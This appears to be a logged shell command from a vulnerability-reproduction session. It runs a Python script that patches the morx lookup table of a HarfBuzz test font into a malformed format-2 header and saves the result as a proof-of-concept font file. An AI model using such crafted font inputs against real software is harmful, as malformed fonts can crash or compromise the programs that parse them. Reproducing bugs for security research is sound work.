Running command: cd /workspace && python3 - <<'PY'
import struct
src='/workspace/repo-vul/src-vul/harfbuzz/test/shaping/data/text-rendering-tests/fonts/TestMORXOne.ttf'
out='/workspace/poc_morx_fmt2_unit2.ttf'
data=bytearray(open(src,'rb').read())
num=struct.unpack('>H',data[4:6])[0]
morx_off=morx_len=None
for i in range(num):
    off=12+i*16
    tag,chk,o,l=struct.unpack('>4sIII',data[off:off+16])
    if tag==b'morx':
        morx_off=o; morx_len=l; break
assert morx_off is not None
lookup=morx_off+60
payload=struct.pack('>HHHHHHH', 2, 2, 1, 2, 0, 0, 0) # fmt, unitSize, nUnits, searchRange, entrySelector, rangeShift, segment.last
# followed by bytes already in table; zero rest of old lookup for deterministic bytes
old_len=morx_len-60
data[lookup:lookup+old_len]=b'\0'*old_len
data[lookup:lookup+len(payload)]=payload
open(out,'wb').write(data)
print(out, len(data), 'morx', morx_off, morx_len, 'lookup bytes', data[lookup:lookup+24].hex())
PY
